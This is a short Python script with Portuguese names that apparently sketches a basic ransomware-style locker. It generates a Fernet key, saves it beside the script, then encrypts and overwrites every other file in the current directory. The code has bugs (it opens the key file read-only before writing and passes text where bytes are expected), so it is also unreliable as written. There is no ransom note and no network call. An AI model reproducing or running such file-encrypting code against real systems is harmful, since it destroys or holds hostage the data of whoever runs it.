from importlib.resources import contents
import os
from cryptography.fernet import Fernet

files = []

key = Fernet.generate_key()

with open('chave.key', 'rb') as chave:
    chave.write(key)

for file in os.listdir():
    if file == 'madará.py' or file == 'chave.key':
        continue
    if os.path.isfile(file):
        files.append(file)


for file in files:
    with open (file, 'r') as arquivo:
        conteúdo = arquivo.read()
    conteúdo_encrypted = Fernet(key).encrypt(conteúdo)
    with open(file, 'wb') as arquivo:
        arquivo.write(conteúdo_encrypted)

    